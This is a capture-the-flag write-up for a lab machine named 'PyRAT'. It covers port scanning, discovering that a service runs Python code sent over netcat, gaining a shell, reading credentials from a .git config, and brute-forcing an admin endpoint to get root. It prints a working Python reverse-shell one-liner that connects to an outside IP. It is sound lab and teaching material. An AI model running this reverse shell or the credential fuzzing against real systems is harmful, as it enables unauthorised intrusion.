<img width="1841" height="326" alt="image" src="https://github.com/user-attachments/assets/286a4bdc-7fff-4156-8c5d-32585674e102" />


In “PyRAT”, our exploration began with an Nmap scan, revealing open ports 22 (SSH) and 8000 (HTTP-alt). Using curl and nc, we interacted with the HTTP-alt service. We exploited Python execution capabilities to gain initial access, achieving a shell on the system. Further investigation led us to a .git directory in /opt, containing configuration files disclosing credentials for a user. Employing a custom Python script for endpoint fuzzing, we identified an admin interface and successfully cracked the password using a threaded password fuzzer, consolidating our control over the system.


Step 1:  First we do Network Scanning

  nmap -sV -A IP


  From the nmap scan we can see there is port 8000 open with http/alt. Doing curl we get an answer from the server:

  curl -v [target ip]:8000

  <img width="1038" height="591" alt="image" src="https://github.com/user-attachments/assets/6c4a7dd2-821c-4611-adcb-3aa17470c0ab" />


  The server answers with: “Try a more basic connection”. The most basic connection we can establish is using nc so…

  nc [target ip] 8000

If we send just: “GET / HTTP/1.1” the server answers with:

Why do we get that our variable GET is not defined? It is possible that the server is executing Python code?

EXPLOITATION

If we send: print("Hello")

The server answers with:  Hello


Try a reverse shell instead. Send this to the server:

<img width="1881" height="121" alt="image" src="https://github.com/user-attachments/assets/ef29660f-42dd-402d-819c-9a7d1454c5a3" />

import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.67.93",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")


The connection hangs and in our nc listener:

<img width="646" height="291" alt="image" src="https://github.com/user-attachments/assets/fa35a7a1-c073-454d-a662-03a3a9514aea" />

So we have a shell on the machine called Pyrat as www-data.

Checking in “/opt” there is a “.git” folder owned by www-data. On the config file we can find the password for a user called think:

<img width="510" height="724" alt="image" src="https://github.com/user-attachments/assets/d46804a5-9101-491a-a8dc-f3b6c247b822" />

 I did ssh think@IP then enter password

 i got Flag


 ROOT

If we download the Git repo to our machine we can see there is a commit on it:

<img width="537" height="136" alt="image" src="https://github.com/user-attachments/assets/fc32ab74-4fcf-4e12-a50a-ada9e8410814" />

On the processes we can see that root is running the process that let us into the machine, let’s grep it:

ps -aux | grep pyrat.py

And we got:

root 2179 0.0 0.0 2608 600 ? Ss 11:16 0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null


If root is running it, there is something we could do to get it run code as root for us.

Since we saw this endpoint existed in the old version, we can fuzz for other endpoints so i have wrote this python script to fuzz for other endpoints:

<img width="657" height="686" alt="image" src="https://github.com/user-attachments/assets/2da2aec4-cd93-4964-abd0-5087771654c7" />

Using it i have found the admin endpoint:

<img width="334" height="50" alt="image" src="https://github.com/user-attachments/assets/69b93536-1b87-4c3f-8ca1-81bb91aae0c7" />


I have added this function to the script to fuzz for passwords:

<img width="859" height="700" alt="image" src="https://github.com/user-attachments/assets/55c48407-ed74-43e4-885e-f146a5fa58ec" />

Running the script gave us this password:  python fuzzer.py

i got passsword : abc123

So now we have the password. Let’s connect again to the rootkit and type
nc 127.0.0.1 8000


<img width="520" height="306" alt="image" src="https://github.com/user-attachments/assets/aec75c23-d31d-409d-99a1-30bf8a0a194c" />


then i got my 2nd Flag
